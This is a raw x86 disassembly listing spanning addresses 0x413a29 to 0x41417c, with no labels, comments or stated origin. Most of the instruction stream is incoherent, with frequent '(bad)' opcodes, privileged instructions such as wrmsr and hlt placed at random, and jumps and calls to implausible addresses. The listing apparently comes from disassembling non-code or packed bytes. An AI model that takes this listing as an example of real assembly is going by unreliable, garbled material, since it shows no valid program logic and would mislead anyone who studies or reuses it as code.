  413a29:	push   ebp
  413a2a:	push   es
  413a2b:	mov    DWORD PTR [ebp-0x4],ebx
  413a2e:	add    edi,esi
  413a30:	pop    es
  413a31:	add    esi,DWORD PTR [edi-0x48ccf183]
  413a37:	mov    DWORD PTR [esp+esi*8],ecx
  413a3a:	inc    ebp
  413a3b:	pop    ebp
  413a3c:	xor    DWORD PTR [esi-0x4],0x3b
  413a40:	add    edx,DWORD PTR [ecx+edi*1]
  413a43:	push   es
  413a44:	clc    
  413a45:	mov    bh,0xdb
  413a47:	jp     0x413a00
  413a49:	add    cl,BYTE PTR [esi]
  413a4b:	div    DWORD PTR [edi+0x4d8b0c1c]
  413a51:	test   edi,edi
  413a53:	je     0x413a49
  413a55:	mov    eax,ecx
  413a57:	or     BYTE PTR [ebx],al
  413a59:	dec    BYTE PTR [ecx+0x7d3bec7d]
  413a5f:	jbe    0x413ad3
  413a61:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  413a67:	add    ecx,DWORD PTR [esi]
  413a69:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  413a6f:	add    eax,DWORD PTR [ebx-0x287af783]
  413a75:	je     0x413ac4
  413a77:	mov    DWORD PTR [ecx],edi
  413a79:	mov    esi,eax
  413a7b:	hlt    
  413a7c:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  413a83:	jb     0x413a45
  413a85:	jmp    0x413a72
  413a87:	xor    esi,DWORD PTR [ebx]
  413a89:	pop    edi
  413a8a:	pop    esi
  413a8b:	pop    ebx
  413a8c:	ret    
  413a8d:	ret    0x8b
  413a90:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  413a96:	xor    DWORD PTR [ecx],0xc
  413a99:	pushf  
  413a9a:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  413aa0:	wrmsr  
  413aa2:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  413aa9:	dec    ebp
  413aaa:	ret    
  413aab:	mov    edi,DWORD PTR [esi-0x4]
  413aae:	pop    eax
  413aaf:	dec    ebp
  413ab0:	jne    0x413a3d
  413ab2:	xor    edi,esp
  413ab4:	inc    eax
  413ab5:	dec    ebp
  413ab6:	jbe    0x413b0b
  413ab8:	inc    eax
  413ab9:	pop    ebp
  413aba:	add    edx,DWORD PTR [esi+0x8]
  413abd:	push   ebp
  413abe:	dec    eax
  413abf:	push   ecx
  413ac0:	mov    eax,edi
  413ac2:	and    al,0xf0
  413ac4:	jo     0x413ab1
  413ac6:	mov    eax,DWORD PTR [ebx]
  413ac8:	sbb    BYTE PTR [ebp+0x4d],cl
  413acb:	mov    eax,DWORD PTR [ebx]
  413acd:	nop
  413ace:	or     BYTE PTR [eax],al
  413ad0:	jne    0x413b29
  413ad2:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  413ad9:	xor    edi,edi
  413adb:	add    edi,DWORD PTR [ebp+0x3]
  413ade:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  413ae4:	js     0x413a6a
  413ae6:	jae    0x413aea
  413ae8:	(bad)  
  413aea:	xor    al,0x5d
  413aec:	jmp    0x413a79
  413aee:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  413af5:	fdecstp 
  413af7:	test   BYTE PTR [edi],ah
  413af9:	add    bh,BYTE PTR [ebp+0x0]
  413afc:	add    ebx,DWORD PTR [ebp-0x77]
  413aff:	mov    edi,eax
  413b01:	cmp    al,0x0
  413b04:	adc    dh,BYTE PTR [ebx]
  413b06:	jge    0x413b0b
  413b08:	mov    edi,DWORD PTR [ebx]
  413b0a:	jl     0x413b1b
  413b0c:	clc    
  413b0d:	dec    edi
  413b0e:	jge    0x413b10
  413b10:	mov    eax,DWORD PTR [ebx]
  413b12:	jb     0x413b1c
  413b14:	mov    ecx,DWORD PTR [ebp-0x8]
  413b17:	mov    edi,edi
  413b19:	xor    edx,DWORD PTR [eax]
  413b1b:	add    edi,DWORD PTR [ebx]
  413b1d:	mov    DWORD PTR [ebp-0x10],edi
  413b20:	inc    edi
  413b21:	pop    ebp
  413b22:	jge    0x413b5f
  413b24:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  413b28:	mov    edx,0xc05d87f0
  413b2d:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  413b31:	fimul  WORD PTR [eax]
  413b33:	fist   WORD PTR [ebp+0x1c]
  413b36:	in     al,dx
  413b37:	jne    0x413b25
  413b39:	mov    edi,DWORD PTR [edx-0x7a27a10]
  413b3f:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  413b43:	fdivp  st(0),st
  413b45:	fild   WORD PTR [ebp+0x4510f85c]
  413b4b:	test   BYTE PTR [ebx+0x4d00fc02],cl
  413b51:	inc    ebp
  413b52:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  413b58:	mov    ebp,DWORD PTR [ebx-0x4]
  413b5b:	adc    al,0x8b
  413b5d:	rcl    DWORD PTR [eax],0x48
  413b60:	mov    esi,0x7080803
  413b65:	fiadd  WORD PTR [ebp+0x4d]
  413b68:	(bad)  
  413b69:	mov    edx,DWORD PTR [edx-0x4]
  413b6c:	mov    edx,DWORD PTR [ebp-0x4]
  413b6f:	xor    ebx,DWORD PTR [ebx+0x330103]
  413b75:	mov    DWORD PTR [edi+0x872dc],edi
  413b7b:	xlat   BYTE PTR ds:[ebx]
  413b7c:	into   
  413b7d:	ffreep st(6)
  413b7f:	retf   0x6c7
  413b82:	iret   
  413b83:	dec    ebp
  413b84:	inc    ebp
  413b85:	mov    DWORD PTR [ebx],edi
  413b87:	fmul   QWORD PTR [edi]
  413b89:	dec    ebp
  413b8a:	jnp    0x413bbf
  413b8c:	add    BYTE PTR [ebx],al
  413b8e:	mov    ecx,DWORD PTR [esp+edi*8]
  413b91:	inc    ebp
  413b92:	dec    ebp
  413b93:	lea    esi,[ebx]
  413b95:	add    DWORD PTR [ebx],eax
  413b97:	jb     0x413bd4
  413b99:	add    BYTE PTR [edi],cl
  413b9b:	inc    ebp
  413b9c:	imul   eax,edi,0x858bd800
  413ba2:	cld    
  413ba3:	clc    
  413ba4:	mov    DWORD PTR [ebp+0x0],eax
  413ba7:	inc    DWORD PTR [eax]
  413ba9:	or     al,0xde
  413bab:	sbb    bh,0x1
  413bae:	retf   
  413baf:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  413bb6:	dec    ebp
  413bb7:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  413bbd:	enter  0x12de,0xdf
  413bc1:	inc    ebp
  413bc2:	pop    ebp
  413bc3:	dec    DWORD PTR [ebx-0x257f0ff4]
  413bc9:	add    DWORD PTR [edx],edx
  413bcb:	add    BYTE PTR [ebp+0x50],dl
  413bce:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  413bd4:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  413bda:	or     ah,al
  413bdc:	pop    ss
  413bdd:	cdq    
  413bde:	push   ebp
  413bdf:	clc    
  413be0:	mov    eax,DWORD PTR [ebp-0x4]
  413be3:	xor    edx,edx
  413be5:	add    esi,DWORD PTR [ebx]
  413be7:	cmp    eax,DWORD PTR [ebx]
  413be9:	hlt    
  413bea:	cmp    DWORD PTR [ebx],esp
  413bec:	or     al,BYTE PTR [ebp+0xf]
  413bef:	mov    eax,DWORD PTR [edx]
  413bf1:	loopne 0x413bf3
  413bf3:	(bad)  
  413bf4:	mov    ecx,esi
  413bf6:	cld    
  413bf7:	pushf  
  413bf8:	pop    ebp
  413bf9:	pushf  
  413bfa:	mov    esi,DWORD PTR [edx]
  413bfc:	lock mov eax,eax
  413bff:	adc    BYTE PTR [ebx],al
  413c01:	or     BYTE PTR [ebx+0x4d001001],0xcf
  413c08:	xor    ebp,DWORD PTR [edi+0x50e45189]
  413c0e:	dec    ebp
  413c0f:	mov    ecx,DWORD PTR [ebx-0x31390304]
  413c15:	(bad)  
  413c16:	iret   
  413c17:	inc    ebp
  413c18:	(bad)  
  413c19:	jne    0x413c68
  413c1b:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  413c21:	(bad)  
  413c22:	cmp    ebx,eax
  413c24:	je     0x413bac
  413c26:	add    edi,edi
  413c28:	or     bh,bh
  413c2a:	dec    ebp
  413c2b:	inc    ebp
  413c2c:	mov    esi,DWORD PTR [ebx]
  413c2e:	cld    
  413c2f:	add    ecx,esi
  413c31:	cmp    ecx,DWORD PTR [eax-0xc]
  413c34:	mov    edx,DWORD PTR [edi]
  413c36:	or     BYTE PTR [ebp-0x7c],al
  413c39:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  413c40:	or     al,0x9c
  413c42:	inc    ebp
  413c43:	xor    bh,BYTE PTR [ecx+ecx*4]
  413c46:	pushf  
  413c47:	call   0x522bd7
  413c4c:	jne    0x413c15
  413c4e:	mov    ebp,esp
  413c50:	fcomp  DWORD PTR [ebx]
  413c52:	add    BYTE PTR [ecx],al
  413c54:	inc    DWORD PTR [ebp-0x75]
  413c57:	(bad)  
  413c58:	cld    
  413c59:	add    al,0xce
  413c5b:	mov    ecx,edi
  413c5d:	cld    
  413c5e:	inc    ebp
  413c5f:	fidivr WORD PTR [ebx]
  413c61:	fbstp  TBYTE PTR [ebp-0x3e]
  413c64:	mov    eax,DWORD PTR [eax]
  413c66:	adc    BYTE PTR [ebx-0x3974038b],cl
  413c6c:	fadd   st,st(7)
  413c6e:	add    BYTE PTR [ebp-0x1],al
  413c71:	mov    ecx,DWORD PTR [esp+edi*8]
  413c74:	inc    ebp
  413c75:	mov    bh,0xc7
  413c78:	loopne 0x413cbf
  413c7a:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  413c80:	sbb    BYTE PTR [ebx],dh
  413c82:	pushf  
  413c83:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  413c89:	mov    eax,edi
  413c8b:	cwde   
  413c8c:	inc    ebp
  413c8d:	inc    ebp
  413c8e:	jne    0x413c1b
  413c90:	mov    esp,esp
  413c92:	clc    
  413c93:	add    al,0x4d
  413c95:	mov    DWORD PTR [ebx],esi
  413c97:	or     al,0x33
  413c99:	inc    ebp
  413c9a:	lea    ecx,[ebx-0x398d13fd]
  413ca0:	add    bh,al
  413ca2:	inc    ebp
  413ca3:	ror    DWORD PTR [ebx+0x45d829],0x8b
  413caa:	add    ebp,esp
  413cac:	shufps xmm1,xmm3,0xc7
  413cb0:	(bad)  
  413cb1:	jmp    0x748677da
  413cb6:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  413cbc:	hlt    
  413cbd:	mov    ecx,DWORD PTR [edi]
  413cbf:	fadd   DWORD PTR [ebp+0x0]
  413cc2:	xor    ecx,DWORD PTR [edi]
  413cc4:	add    ecx,ecx
  413cc6:	cmp    edi,edi
  413cc8:	pmuludq mm7,QWORD PTR [edx+0x50]
  413ccc:	(bad)  
  413ccd:	jmp    0x413c5a
  413ccf:	mov    edi,esp
  413cd1:	or     al,0xc6
  413cd3:	inc    ebp
  413cd4:	(bad)  
  413cd5:	mov    eax,DWORD PTR [ebp+0x10]
  413cd8:	jne    0x413c63
  413cda:	mov    eax,DWORD PTR [ecx]
  413cdc:	clc    
  413cdd:	add    BYTE PTR [ebp-0x40],cl
  413ce0:	xor    edx,DWORD PTR [eax-0x73]
  413ce3:	jne    0x413ce6
  413ce5:	push   DWORD PTR [edx+0x8]
  413ce8:	add    BYTE PTR [ebp+0x45],al
  413ceb:	mov    ebp,ecx
  413ced:	cld    
  413cee:	add    BYTE PTR [ebp+0x0],cl
  413cf1:	xor    eax,DWORD PTR [ebp+0x3]
  413cf4:	mov    DWORD PTR [ebx],edi
  413cf6:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  413cfc:	sub    eax,0x5d330e4d
  413d01:	lea    esi,[ebx]
  413d03:	add    DWORD PTR [ebx],eax
  413d05:	jb     0x413cf0
  413d07:	add    BYTE PTR [eax],al
  413d09:	inc    ebp
  413d0a:	add    bl,ch
  413d0c:	inc    ebp
  413d0d:	mov    esi,DWORD PTR [ebx]
  413d0f:	or     al,0x3
  413d11:	(bad)  
  413d12:	mov    edi,eax
  413d14:	in     al,dx
  413d15:	scas   eax,DWORD PTR es:[edi]
  413d16:	inc    ebp
  413d17:	mov    esi,DWORD PTR [ebx]
  413d19:	in     al,0x3
  413d1b:	add    al,0x89
  413d1d:	mov    ecx,DWORD PTR [eax+edi*8]
  413d20:	dec    ebp
  413d21:	(bad)  
  413d22:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  413d29:	mov    ecx,eax
  413d2b:	cld    
  413d2c:	push   es
  413d2d:	dec    ebp
  413d2e:	add    al,0x33
  413d30:	mov    DWORD PTR [ebx],eax
  413d32:	in     al,dx
  413d33:	cmp    DWORD PTR [ebp-0x67],eax
  413d36:	mov    eax,DWORD PTR [ebp-0xba0068]
  413d3c:	mov    edx,DWORD PTR [ebp-0x4]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x18]
  413d42:	xor    ecx,DWORD PTR [ebp+0x3]
  413d45:	cmp    DWORD PTR [ebx],0x8b32749b
  413d4b:	xor    edi,esp
  413d4d:	jmp    0xff753a9f
  413d52:	add    ecx,DWORD PTR [ebp-0x3f]
  413d55:	xor    ebx,DWORD PTR [edi]
  413d57:	add    eax,ecx
  413d59:	cmp    ebx,DWORD PTR [eax]
  413d5b:	mov    ecx,DWORD PTR [ebp-0x4]
  413d5e:	mov    ecx,DWORD PTR [eax]
  413d60:	adc    BYTE PTR [ebp-0x80],al
  413d63:	jmp    0x413d66
  413d65:	mov    eax,DWORD PTR [eax]
  413d67:	cld    
  413d68:	mov    bh,0xc6
  413d6a:	push   ecx
  413d6b:	(bad)  
  413d6c:	jne    0x413dcc
  413d6e:	dec    ecx
  413d70:	or     BYTE PTR [ecx+ebx*1],cl
  413d73:	push   ebp
  413d74:	inc    ebp
  413d75:	in     al,dx
  413d76:	add    ebp,esp
  413d78:	or     bh,al
  413d7a:	dec    ebp
  413d7b:	cld    
  413d7c:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  413d82:	xor    DWORD PTR [eax],0x2
  413d85:	pushf  
  413d86:	dec    DWORD PTR [ebx+0x45510cf4]
  413d8c:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  413d92:	mov    edx,DWORD PTR [ecx+0xc]
  413d95:	xor    eax,esi
  413d97:	mov    edx,0xc172c7
  413d9c:	inc    ebp
  413d9d:	mov    esi,DWORD PTR [ebp+0x8]
  413da0:	mov    eax,edx
  413da2:	call   0x84c60497
  413da7:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  413dae:	call   0x4db14dbb
  413db3:	push   edi
  413db4:	xor    esi,DWORD PTR [ebp+0x3]
  413db7:	(bad)  
  413db8:	pmulhuw mm0,mm1
  413dbb:	test   DWORD PTR [ebp-0x8],ecx
  413dbe:	mov    DWORD PTR [ebp-0x67],eax
  413dc1:	mov    eax,DWORD PTR [ebp-0x4]
  413dc4:	xor    edi,DWORD PTR [ebp-0x73]
  413dc7:	xor    eax,DWORD PTR [ebx]
  413dc9:	xor    esi,DWORD PTR [edx+0x3]
  413dcc:	add    BYTE PTR [ecx],bh
  413dce:	inc    ebp
  413dcf:	(bad)  
  413dd0:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  413dd6:	mov    DWORD PTR [eax],0x750f0004
  413ddc:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  413de2:	lock add BYTE PTR [ebp+0x0],al
  413de6:	mov    esi,DWORD PTR [ebp-0x2c]
  413de9:	mov    ebp,edx
  413deb:	or     al,0x72
  413ded:	ja     0x413def
  413def:	mov    edx,esi
  413df1:	cld    
  413df2:	(bad)  
  413df5:	cli    
  413df6:	mov    esi,DWORD PTR [ebp-0x4]
  413df9:	cmp    ecx,esi
  413dfb:	bswap  edi
  413dfd:	(bad)
  413e01:	mov    esi,DWORD PTR [ebp-0x4]
  413e04:	mov    esi,ecx
  413e06:	clc    
  413e07:	repnz add esi,DWORD PTR [ebp+0x45]
  413e0b:	push   ebx
  413e0c:	xor    eax,DWORD PTR [ebp+0x3]
  413e0f:	xor    bl,BYTE PTR [edi-0x64]
  413e12:	pop    ebx
  413e13:	jmp    0x413eda
  413e18:	mov    esi,DWORD PTR [ebp-0x7d]
  413e1b:	xor    ebp,DWORD PTR [eax]
  413e1d:	lea    eax,[ebp-0x8]
  413e20:	xor    edx,esi
  413e22:	pushf  
  413e23:	out    dx,eax
  413e24:	(bad)  
  413e25:	neg    eax
  413e27:	ins    DWORD PTR es:[edi],dx
  413e28:	test   esi,edi
  413e2a:	clc    
  413e2b:	pop    esp
  413e2c:	inc    ebp
  413e2d:	or     BYTE PTR [ecx+0x450f0c7d],cl
  413e33:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  413e39:	add    cl,al
  413e3b:	jne    0x413dd9
  413e3d:	mov    esi,DWORD PTR [edx]
  413e3f:	in     al,dx
  413e40:	push   esi
  413e41:	xor    BYTE PTR [ebp-0xe],dh
  413e44:	add    edi,esi
  413e46:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  413e4c:	add    cl,bh
  413e4e:	mov    edi,DWORD PTR [ebp+0x8]
  413e51:	mov    DWORD PTR [ebp-0x14],esi
  413e54:	add    esi,DWORD PTR [ebp+0x3c]
  413e57:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  413e5d:	mov    ah,0x3c
  413e5f:	pushf  
  413e60:	pushf  
  413e61:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  413e67:	jne    0x413df4
  413e69:	mov    ecx,DWORD PTR [esp+ebp*8]
  413e6c:	icebp  
  413e6d:	icebp  
  413e6e:	shl    edx,0xf2
  413e71:	(bad)  
  413e72:	mov    ah,0x16
  413e74:	pop    eax
  413e75:	jne    0x413e0a
  413e77:	mov    ecx,DWORD PTR [edi]
  413e79:	in     al,dx
  413e7a:	jmp    0x413e6d
  413e7c:	add    dl,dh
  413e7e:	mov    edi,esi
  413e80:	or     al,0x8
  413e82:	inc    ebp
  413e83:	jne    0x413e88
  413e85:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  413e8b:	ret    
  413e8c:	or     bh,bh
  413e8e:	jge    0x413e78
  413e90:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  413e96:	xor    edi,eax
  413e98:	add    esi,DWORD PTR [ebp-0x77]
  413e9b:	mov    ebx,esp
  413e9d:	clc    
  413e9e:	neg    DWORD PTR [ebp-0x7c]
  413ea1:	xor    eax,DWORD PTR [eax]
  413ea3:	cmp    eax,DWORD PTR [eax]
  413ea5:	repz jne 0x413e3d
  413ea8:	xor    eax,DWORD PTR [ecx]
  413eaa:	add    ebx,DWORD PTR [eax]
  413eac:	mov    DWORD PTR [ebp-0x8],eax
  413eaf:	mov    eax,edi
  413eb1:	cld    
  413eb2:	lock pop eax
  413eb4:	test   DWORD PTR [ebx],esi
  413eb6:	clc    
  413eb7:	add    edx,DWORD PTR [edi-0x740bff77]
  413ebd:	fdivp  st(4),st
  413ebf:	test   ecx,esi
  413ec1:	(bad)  
  413ec2:	jnp    0x413ec3
  413ec4:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  413eca:	jae    0x413e57
  413ecc:	sub    edi,esp
  413ece:	(bad)  
  413ecf:	shl    DWORD PTR [eax-0x3e],0x89
  413ed3:	leave  
  413ed4:	call   0x8196f5e1
  413ed9:	in     al,dx
  413eda:	(bad)  
  413edb:	in     al,dx
  413edc:	add    bh,al
  413ede:	mov    esp,edi
  413ee0:	in     al,dx
  413ee1:	test   DWORD PTR [ebp-0x8],edi
  413ee4:	mov    eax,DWORD PTR [ebp+0x2b]
  413ee7:	xor    BYTE PTR [ebx],al
  413ee9:	pushf  
  413eea:	jnp    0x57303b23
  413ef0:	xor    edx,DWORD PTR [ebp-0x77]
  413ef3:	push   ecx
  413ef4:	loopne 0x413f29
  413ef6:	jne    0x413eb3
  413ef8:	mov    esi,DWORD PTR [edx-0x20]
  413efb:	add    BYTE PTR [ebp-0x3d],bh
  413efe:	xor    eax,DWORD PTR [ebp-0x73]
  413f01:	mov    edi,DWORD PTR [esi]
  413f03:	cld    
  413f04:	jb     0x413ecc
  413f06:	add    bl,al
  413f08:	jne    0x413f4f
  413f0a:	mov    edx,DWORD PTR [edi-0x10]
  413f0d:	jge    0x413f8c
  413f0f:	mov    esi,DWORD PTR [ebx]
  413f11:	lock add ecx,DWORD PTR [ebp+0x3b]
  413f15:	xor    esi,DWORD PTR [ebp-0x77]
  413f18:	mov    esi,eax
  413f1a:	lock inc ebp
  413f1c:	jge    0x413f4f
  413f1e:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  413f25:	dec    ebp
  413f26:	mov    esi,DWORD PTR [ebx]
  413f28:	loopne 0x413eb3
  413f2a:	jge    0x413f24
  413f2c:	add    DWORD PTR [ebp-0x7d],eax
  413f2f:	icebp  
  413f30:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  413f37:	dec    ebp
  413f38:	hlt    
  413f39:	xor    ebx,DWORD PTR [ebp-0x77]
  413f3c:	mov    esi,esp
  413f3e:	in     al,0x45
  413f40:	jge    0x413f7f
  413f42:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  413f49:	dec    ebp
  413f4a:	pop    esp
  413f4b:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  413f51:	inc    ebp
  413f52:	hlt    
  413f53:	xor    DWORD PTR [ebp-0x61],esi
  413f56:	mov    edi,DWORD PTR [eax+0xf19504]
  413f5c:	repnz mov DWORD PTR [ebp+0x20],ebx
  413f60:	cmp    eax,DWORD PTR [ebp+0xf]
  413f63:	test   DWORD PTR [edi+ecx*1-0x1],edx
  413f67:	fistp  WORD PTR [ebx+0x0]
  413f6a:	inc    ebp
  413f6b:	mov    ebx,DWORD PTR [edi+0xc]
  413f6e:	add    eax,eax
  413f70:	inc    ebp
  413f71:	test   BYTE PTR [ebx],dh
  413f73:	add    eax,DWORD PTR [ebx]
  413f75:	add    BYTE PTR [esi+0x45],bl
  413f78:	ret    0x85
  413f7b:	jnp    0x5441c34a
  413f81:	inc    bp
  413f83:	inc    ebp
  413f84:	xor    DWORD PTR [ecx+0xc78a9c],edi
  413f8a:	fdiv   QWORD PTR [ebx]
  413f8c:	test   DWORD PTR [ecx+0x453bf8],edi
  413f92:	push   ebx
  413f93:	add    edi,DWORD PTR [esi+0x708088b]
  413f99:	cmp    esi,eax
  413f9b:	setl   BYTE PTR [ecx-0x74fcffce]
  413fa2:	mov    esp,edi
  413fa4:	call   0x33cc84f6
  413fa9:	or     BYTE PTR [ebx],al
  413fab:	inc    ecx
  413fac:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  413fb2:	and    BYTE PTR [ebp-0x7074f0bb],al
  413fb8:	lock add cl,al
  413fbb:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  413fc2:	mov    ch,0x45
  413fc4:	clc    
  413fc5:	xor    eax,DWORD PTR [ebp+0x3]
  413fc8:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  413fce:	inc    ebp
  413fcf:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  413fd5:	mov    edi,eax
  413fd7:	mov    eax,DWORD PTR [ebp+0x3c]
  413fda:	mov    ecx,DWORD PTR [eax]
  413fdc:	hlt    
  413fdd:	inc    ebp
  413fde:	ror    DWORD PTR [ebx+0x818c45],0xf4
  413fe5:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  413feb:	push   ebp
  413fec:	mov    edi,DWORD PTR [ebx]
  413fee:	in     al,dx
  413fef:	jne    0x413fb2
  413ff1:	mov    eax,DWORD PTR [ebp-0x28]
  413ff4:	add    DWORD PTR [eax],0xe8058dec
  413ffa:	clc    
  413ffb:	mov    esi,DWORD PTR [edi-0x8]
  413ffe:	add    dh,dl
  414000:	rol    WORD PTR [ebp-0x1],cl
  414004:	mov    edx,DWORD PTR [eax+0x8]
  414007:	jne    0x413fc9
  414009:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  414010:	inc    ebp
  414011:	push   esp
  414012:	test   DWORD PTR [ecx+0xf],ecx
  414015:	sub    edx,esp
  414017:	add    eax,DWORD PTR [eax]
  414019:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  41401f:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  414026:	mov    eax,DWORD PTR [ecx]
  414028:	and    BYTE PTR [eax],al
  41402a:	adc    BYTE PTR ds:[eax],al
  41402d:	inc    ebp
  41402e:	inc    cx
  414031:	push   esp
  414032:	add    al,0x75
  414034:	add    BYTE PTR [edx+0x66],dl
  414037:	enter  0xc1,0x4d
  41403b:	mov    esp,DWORD PTR [esi+0x20]
  41403e:	add    DWORD PTR [ecx-0x7b],eax
  414041:	add    eax,DWORD PTR [ebx]
  414043:	str    WORD PTR [eax+0x45]
  414047:	lea    ecx,[ebx+0x45890801]
  41404d:	sbb    BYTE PTR [ebx],al
  41404f:	dec    ebp
  414050:	cmp    al,0xf
  414052:	inc    ebp
  414053:	push   eax
  414054:	mov    esi,DWORD PTR [ebx]
  414056:	push   eax
  414057:	add    eax,eax
  414059:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  414060:	inc    ebp
  414061:	add    BYTE PTR [ecx],dh
  414063:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  41406a:	(bad)  
  41406b:	mov    ebx,eax
  41406d:	loopne 0x4140b4
  41406f:	dec    ebp
  414070:	mov    ecx,DWORD PTR [edi]
  414072:	cld    
  414073:	push   eax
  414074:	xchg   DWORD PTR [ebx],esi
  414076:	add    DWORD PTR [ebx],ebp
  414078:	add    BYTE PTR [ebx],ch
  41407a:	or     BYTE PTR [ecx],bh
  41407c:	dec    ecx
  41407d:	loopne 0x414082
  41407f:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  414085:	push   ebp
  414086:	add    DWORD PTR [ebx+0x55100800],eax
  41408c:	dec    ebp
  41408d:	jmp    0x414018
  41408f:	mov    esp,DWORD PTR [eax]
  414091:	sbb    dl,dl
  414093:	inc    eax
  414094:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  41409a:	add    BYTE PTR [ebx+0x74528555],cl
  4140a0:	push   ebp
  4140a1:	div    DWORD PTR [ebx]
  4140a3:	and    eax,DWORD PTR [ebx]
  4140a5:	add    edx,DWORD PTR [edx-0x30]
  4140a8:	jno    0x414035
  4140aa:	inc    DWORD PTR [eax+eiz*1]
  4140ad:	inc    ebp
  4140ae:	push   eax
  4140af:	push   eax
  4140b0:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4140b6:	mov    edi,esp
  4140b8:	push   eax
  4140b9:	inc    ebp
  4140ba:	enter  0x458b,0x8
  4140be:	push   ecx
  4140bf:	(bad)  
  4140c0:	call   0x10b4a98
  4140c5:	pop    ss
  4140c6:	push   ebp
  4140c7:	mov    ecx,DWORD PTR [ebx+0x489408]
  4140cd:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4140d3:	push   ecx
  4140d4:	jo     0x4140be
  4140d6:	inc    DWORD PTR [edi]
  4140d8:	or     BYTE PTR [eax],al
  4140da:	call   0xcc4824
  4140df:	fmul   QWORD PTR [ebp+0x55]
  4140e2:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4140e8:	mov    bh,0x8c
  4140ea:	adc    al,0x9c
  4140ec:	dec    esp
  4140ed:	xor    bl,BYTE PTR [eax]
  4140ef:	mov    ecx,DWORD PTR [ebp+0xc]
  4140f2:	mov    eax,DWORD PTR [ebp-0x4]
  4140f5:	mov    esi,DWORD PTR [edi-0x3148f924]
  4140fb:	push   es
  4140fc:	retf   
  4140fd:	mov    BYTE PTR [ebp-0x30],0x3b
  414101:	inc    ebp
  414102:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  414109:	retf   0x83fc
  41410c:	into   
  41410d:	dec    ebp
  41410e:	retf   
  41410f:	mov    ecx,DWORD PTR [ebp-0x74]
  414112:	mov    eax,DWORD PTR [eax]
  414114:	fdiv   QWORD PTR [ebx]
  414116:	mov    bh,0x3
  414118:	push   es
  414119:	mov    esi,ecx
  41411b:	sbb    cl,dl
  41411d:	dec    ebp
  41411e:	sar    DWORD PTR [ebx],cl
  414120:	push   ebp
  414121:	jne    0x414132
  414123:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  414129:	lea    ebx,[eax]
  41412b:	call   0xf4caccf2
  414130:	sbb    dh,dl
  414132:	add    edx,ebx
  414134:	push   ebp
  414135:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  41413b:	push   ecx
  41413c:	mov    DWORD PTR [eax-0x30],edx
  41413f:	test   DWORD PTR [edx],eax
  414141:	xadd   esp,esi
  414144:	pop    es
  414145:	add    cl,dl
  414147:	mov    eax,ecx
  414149:	or     al,0x45
  41414b:	(bad)  
  41414c:	push   eax
  41414d:	add    DWORD PTR [edx+0x0],eax
  414150:	add    ecx,DWORD PTR [ecx]
  414152:	and    dh,cl
  414154:	call   0xc54a24
  414159:	add    DWORD PTR [ebp+0x0],edx
  41415c:	mov    esp,DWORD PTR [ebp+0x18]
  41415f:	add    BYTE PTR [eax+0x54],cl
  414162:	xor    eax,DWORD PTR [eax]
  414164:	add    esp,DWORD PTR [esi+0x3b]
  414167:	inc    ebp
  414168:	je     0x4140ed
  41416a:	push   ecx
  41416b:	cli    
  41416c:	dec    ebp
  41416d:	mov    DWORD PTR [ebx],eax
  41416f:	(bad)  
  414170:	or     al,0x5e
  414172:	inc    eax
  414173:	add    BYTE PTR [ebx],al
  414175:	data16 and BYTE PTR [ebp+0x50],al
  414179:	sub    DWORD PTR [ecx],0xfffffff8
  41417c:	add    BYTE PTR [ebp-0x75],ah
